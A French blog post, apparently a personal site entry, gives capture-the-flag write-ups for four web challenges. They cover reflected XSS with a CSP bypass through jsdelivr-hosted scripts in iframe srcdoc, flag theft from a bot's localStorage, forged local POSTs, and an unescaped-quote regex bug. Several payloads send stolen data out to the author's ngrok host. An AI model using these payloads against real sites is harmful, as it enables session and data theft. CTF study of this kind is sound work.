@@ -1,0 +1,328 @@
+---
+title: Write-ups des CTFs web de polygl0ts
+date: 2026-07-06
+lang: fr
+---
+
+import Figure from '../../../components/Figure.astro';
+import airbnb from './airbnb.png';
+
+
+![polygl0ts](polygl0ts.png)
+
+Polygl0ts vient de poster l'annonce ci-dessus sur leur serveur Discord ! Et comme j'ai très envie d'aller à la DEF CON, voici un write ups de tous les CTFs web des chals du vendredi ! Je les avais déjà fait l'an passé mais c'est toujours fun de les refaire.
+
+![web](./web.png)
+
+
+## CDN
+
+Commençons par CDN !
+
+> Trigger warning : oui je suis sous MacOS, et si ça vous pose un problème on peut en discuter sur Discord @androz2091 :)
+
+```
+poca@pocas-MacBook-Pro-2 cdn % tree
+.
+├── __pycache__
+│   └── bot.cpython-310.pyc
+├── app.py
+├── bot.py
+├── docker-compose.yml
+├── Dockerfile
+├── requirements.txt
+├── static
+│   ├── main.js
+│   └── style.css
+└── templates
+    └── index.html
+
+4 directories, 9 files
+poca@pocas-MacBook-Pro-2 cdn %
+```
+
+On a visiblement l'air de disposer de tout le code source de l'appli et d'une instance live à hacker (https://cdn-dc0k4gw8wcscgs0k84ckcg44.polygl0ts.manaf.ch).
+
+C'est pratique, on va pouvoir répliquer notre solution en locale. En jetant un oeil au code Python, il m'a l'air safe à exécuter (je suis un peu traumatisé après Insomni'hack 2025 où un challenge exécuté hors sandbox envoyait une requête qui déclenchait un son "shame" via un haut parleur lol).
+
+Bref, commençons par run le docker compose.
+
+En tapant dans la zone de texte, l'URL se met à jour, et le code du `main.js` nous montre clairement que le contenu de l'URL est chargé initialement :
+```js
+const urlParams = new URLSearchParams(window.location.search);
+const searchTerm = urlParams.get('search');
+if (searchTerm) {
+    searchInput.value = decodeURIComponent(searchTerm);
+    updateSearch()
+} else {
+    displayComments(comments);
+}
+```
+
+C'est donc quasiment certainement une injection XSS. On voit que le code Python est celui d'un serveur avec deux endpoints :
+- `/`, qui sert le contenu
+- `/report`, qui prend en paramètre une URL et envoie un bot dessus. 
+
+On doit donc sans doute donner au bot une URL avec un param de recherche malveillant.
+
+C'est aussi ce que laisse suggérer le code du bot :
+
+```py
+# Go to the site
+driver.get(f"http://localhost:{PORT}")
+# Wait for the page to load
+driver.implicitly_wait(1)
+# Set the flag in local storage
+driver.execute_script(f"window.localStorage.setItem('flag','{FLAG}');")
+
+# Visit the URL
+driver.get(url)
+```
+
+Il va d'abord visiter la page `/` du serveur Python, y dépose le flag, puis notre URL. Notre URL doit donc être cette même page `/` accompagnée d'un param malveillant qui extrait le flag déposé.
+
+J'essaierais donc de faire faire une requête du bot vers un serveur que je contrôle pour récupérer le token.
+
+Mais avant ça, essayons de voir si charger la page moi-même fait bien une requête vers mon serveur local, via un inline script basique :
+```html
+<img onerror="window.location = 'https://a844-161-115-51-75.ngrok-free.app'" />
+```
+
+Premier problème !
+
+> Content-Security-Policy: The page’s settings blocked an inline script (script-src-elem) from being executed because it violates the following directive: “default-src http://cdn.jsdelivr.net 'self'”. Consider using a hash ('sha256-f7e2FzTlLBcKV18x7AY/5TeX5EoQtT0BZxrV1/f1odI=') or a nonce.
+
+ok, deux problèmes que je n'avais pas spotté en lisant le HTML à la base :
+- le script n'accepte que les scripts qui viennent de jsdelivr. Heureusement, servir du code arbitraire via jsdelivr est super simple (il y a littéralement une page dédiée à ça sur leur site : https://www.jsdelivr.com/github) ! Ainsi, j'ai mon payload accessible via `https://cdn.jsdelivr.net/gh/Androz2091/polygl0ts-28-1@main/payload7.js`.
+- ensuite, `img` ne va pas marcher, car la page n'accepte pas les inline scripts
+
+Le trick est d'utiliser `iframe` avec un `srcdoc` (ça c'est Manaf qui me l'a appris directement ahah):
+```html
+<iframe srcdoc='<script src="https://cdn.jsdelivr.net/gh/Androz2091/polygl0ts-28-1@main/payload7.js"></script>'></iframe>
+```
+
+On a notre première requête !
+![req1test](./req1test.png)
+
+Maintenant envoyons-là à l'endpoint `/report` :
+```js
+const payload = `<iframe srcdoc='<script src="https://cdn.jsdelivr.net/gh/Androz2091/polygl0ts-28-1@main/payload7.js"></script>'></iframe>`
+const inner = `http://localhost:9007/?search=${encodeURIComponent(payload)}`
+const report = new URL(
+  "https://cdn-dc0k4gw8wcscgs0k84ckcg44.polygl0ts.manaf.ch/report",
+)
+// const report = new URL("http://localhost:9007/report")
+report.searchParams.set("url", inner)
+fetch(report)
+```
+
+avec le payload suivant :
+```js
+window.top.location.href = "https://17b9-161-115-51-75.ngrok-free.app/" + localStorage.getItem('flag');
+```
+
+Et c'est bon !
+
+![req1success](./req1success.png)
+
+Continuons !
+
+![web14](./web14.png)
+
+## getFlag
+
+```
+poca@pocas-MacBook-Pro-2 getFlag % tree
+.
+├── app.py
+├── bot.py
+├── docker-compose.yml
+├── Dockerfile
+├── requirements.txt
+└── templates
+    └── index.html
+
+2 directories, 6 files
+poca@pocas-MacBook-Pro-2 getFlag %
+```
+
+C'est à peu près le même site, à une différence près, le bot ne dépose plus le flag dans le local storage, et il y a un nouvel endpoint `getFlag` :
+
+```py
+@app.route('/getFlag', methods=['GET', 'POST'])
+def getFlag():
+    if request.remote_addr != '127.0.0.1':
+        return 'Error: Access Denied!'
+    if request.method != 'POST':
+        return 'Error: Invalid Method!'
+    if request.json.get('giveMe') != 'theFlag':
+        return 'Error: Invalid Request!'
+    return FLAG
+```
+
+Cette endpoint attend donc une requête locale POST avec un payload json `giveMe` égale à `theFlag`. Je pense qu'il faut juste modifier le script pour qu'il fasse cette requête puis ensuite le trick du `window.location` vers ngrok ?
+
+```js
+fetch("http://localhost:9007/getFlag", {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json"
+  },
+  body: JSON.stringify({
+    giveMe: "theFlag"
+  })
+})
+.then(res => res.text())
+.then(flag => window.top.location.href = "https://17b9-161-115-51-75.ngrok-free.app/" + flag);
+```
+
+Nice! après quelques erreurs bêtes, ça passe ! (par erreur bête j'entends oublier de changer les ports que Manaf a changé de `9007` vers `9003` par exemple)
+
+![req2success](./req2success.png)
+
+Continuons !
+
+![web24](./web24.png)
+
+
+## IMDB
+
+En chargeant la site (https://app-y44s0owgwwowok0kgk8k8o08.polygl0ts.manaf.ch/), on arrive sur la page suivante :
+
+![imdb](./imdb.png)
+
+Et en cliquant sur le bouton submit, on voit une requête qui part :
+
+```sh
+curl 'https://app-y44s0owgwwowok0kgk8k8o08.polygl0ts.manaf.ch/visit' \
+  -X POST \
+  -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:151.0) Gecko/20100101 Firefox/151.0' \
+  -H 'Accept: */*' \
+  -H 'Accept-Language: en-US,en;q=0.9' \
+  -H 'Accept-Encoding: gzip, deflate, br, zstd' \
+  -H 'Referer: https://app-y44s0owgwwowok0kgk8k8o08.polygl0ts.manaf.ch/' \
+  -H 'Content-Type: application/json' \
+  -H 'Origin: https://app-y44s0owgwwowok0kgk8k8o08.polygl0ts.manaf.ch' \
+  -H 'Alt-Used: app-y44s0owgwwowok0kgk8k8o08.polygl0ts.manaf.ch' \
+  -H 'Connection: keep-alive' \
+  -H 'Sec-Fetch-Dest: empty' \
+  -H 'Sec-Fetch-Mode: cors' \
+  -H 'Sec-Fetch-Site: same-origin' \
+  -H 'Priority: u=0' \
+  -H 'Pragma: no-cache' \
+  -H 'Cache-Control: no-cache' \
+  --data-raw '{"url":"https://app-y44s0owgwwowok0kgk8k8o08.polygl0ts.manaf.ch/"}'
+```
+
+(je l'ai récup via inspecter > network > copy as cURL)
+
+Ainsi, il semblerait qu'on puisse faire visiter une URL à un bot...?
+En tapant quelque chose dans la barre de recherche, on voit que l'URL se modifie comme pour CDN.
+Peut-être que le bot fait comme CDN, et laisse le flag dans le localStorage ?
+
+Réutilions le même payload :
+```js
+const payload = `<iframe srcdoc='<script src="https://cdn.jsdelivr.net/gh/Androz2091/polygl0ts-28-1@main/payload7.js"></script>'></iframe>`
+
+const inner = `https://app-y44s0owgwwowok0kgk8k8o08.polygl0ts.manaf.ch/?search=${encodeURIComponent(payload)}`
+
+const res = await fetch(
+  "https://app-y44s0owgwwowok0kgk8k8o08.polygl0ts.manaf.ch/visit",
+  {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      url: inner,
+    }),
+  },
+)
+
+console.log(await res.text())
+```
+
+Yep, there we go!!
+
+Continuons (il me reste 11% pour réussir le dernier challenge!)
+
+![web34](./web34.png)
+
+## IMDB 2
+
+Ok, cette fois on passe sur du NodeJS nice ! (ce nice est sincère mais va me disqualifier pour la sélection de la DEF CON lol)
+
+```
+poca@pocas-MacBook-Pro-2 ctf-challenge % tree
+.
+├── bot
+│   ├── bot.js
+│   ├── Dockerfile
+│   ├── index.html
+│   ├── package.json
+│   └── pnpm-lock.yaml
+├── docker-compose.yml
+└── README.md
+
+2 directories, 7 files
+poca@pocas-MacBook-Pro-2 ctf-challenge %
+```
+
+C'est le même principe mais cette fois-ci le bot va sur une page `CHALLENGE_URL` inconnue et y laisse le cookie.
+
+```js
+const context = await browser.newContext();
+const page = await context.newPage();
+
+// Visit the challenge website first
+await page.goto(CHALLENGE_URL);
+
+// Set the flag in localStorage
+await page.evaluate((flag) => {
+    localStorage.setItem('flag', flag);
+}, FLAG);
+
+// Navigate to the user's URL
+await page.goto(url);
+```
+
+Ok quelques hypothèses pour `CHALLENGE_URL` :
+- l'URL de base de l'app, soit https://app-ygg44o84ck8okk8ggkk0ckws.takeru.manaf.ch/
+- l'URL locale de l'app soit http://localhost:1337
+
+Je viens d'essayer les deux, et ça ne marche pas !
+En fait, en lisant le code JS..., on voit que les guillements sont échappés !
+
+```js
+// no quotes >:/
+searchDisplay.innerHTML = searchTerm.replace(/['"`]/, "");
+```
+
+(bon après avoir passé un peu de temps dessus, je me rends compte que le commentaire est assez fourbe, il manque le `\g` et seul le premier guillement est escape :)
+
+```js
+const payload = `"<iframe srcdoc='<script src="https://cdn.jsdelivr.net/gh/Androz2091/polygl0ts-28-1@main/payload7.js"></script>'></iframe>`
+
+const inner = `https://app-ygg44o84ck8okk8ggkk0ckws.takeru.manaf.ch/?search=${encodeURIComponent(payload)}`
+
+const res = await fetch(
+  "https://app-ygg44o84ck8okk8ggkk0ckws.takeru.manaf.ch/visit",
+  {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+    },
+    body: JSON.stringify({
+      url: inner,
+    }),
+  },
+)
+
+console.log(await res.text())
+```
+
+Le code ci-dessus fonctionne donc !
+
+![web44](./web44.png)
+
+Voilà voilà, pour toute question je suis sur Discord, et vous pouvez me contacter à peu près n'importe où en cliquant sur https://androz2091.fr !
